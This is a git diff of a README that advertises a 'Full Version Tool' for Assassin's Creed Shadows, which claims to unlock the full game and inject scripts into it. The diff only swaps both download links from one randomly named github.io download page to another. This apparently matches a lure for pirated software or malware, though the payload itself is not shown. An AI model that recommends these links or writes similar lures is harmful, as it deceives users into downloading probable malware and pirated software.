@@ -2,7 +2,7 @@
 
 Assassin's Creed Shadows 2026 Full Version Tool is the ultimate enhancement package for AC Shadows, designed to unlock full game features and optimize performance on Windows 10/11. This tool provides a seamless experience with custom tweaks and improvements, ensuring you get the most out of your gameplay. Whether you're looking for better graphics or smoother controls, this tool has you covered.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -66,7 +66,7 @@ The tool operates by injecting enhancement scripts into the game process, allowi
 
 For the latest version and more information, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Support and Feedback
 
